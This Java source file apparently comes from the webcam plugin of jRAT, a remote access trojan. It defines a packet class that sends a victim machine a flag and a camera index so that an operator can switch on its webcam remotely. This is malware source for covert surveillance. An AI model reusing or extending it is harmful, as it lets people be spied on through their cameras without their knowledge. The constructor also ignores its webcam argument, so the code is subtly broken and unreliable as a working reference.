package se.jrat.plugin.webcam.client;

import java.io.DataInputStream;
import java.io.DataOutputStream;

import jrat.api.PacketBuilder;
import jrat.api.RATObject;

public class Packet120Webcam extends PacketBuilder {

	private int webcam;
	
	public Packet120Webcam(RATObject rat, int webcam) {
		super(WebcamPlugin.HEADER, rat);
	}

	@Override
	public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {
		dos.writeBoolean(WebcamPlugin.enabled);
		dos.writeInt(webcam);
	}

}
